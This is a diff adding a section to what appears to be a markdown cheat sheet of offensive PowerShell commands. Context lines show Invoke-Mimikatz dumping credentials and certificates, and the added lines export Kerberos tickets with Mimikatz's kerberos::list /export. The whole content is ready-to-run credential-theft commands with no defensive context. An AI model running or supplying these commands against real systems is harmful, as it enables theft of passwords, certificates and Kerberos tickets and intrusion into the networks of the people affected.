@@ -185,3 +185,7 @@ Dump creds and certs
 Invoke-Mimikatz -DumpCreds
 Invoke-Mimikatz -DumpCerts
 ```
+Export kerberos tickets
+```powershell
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
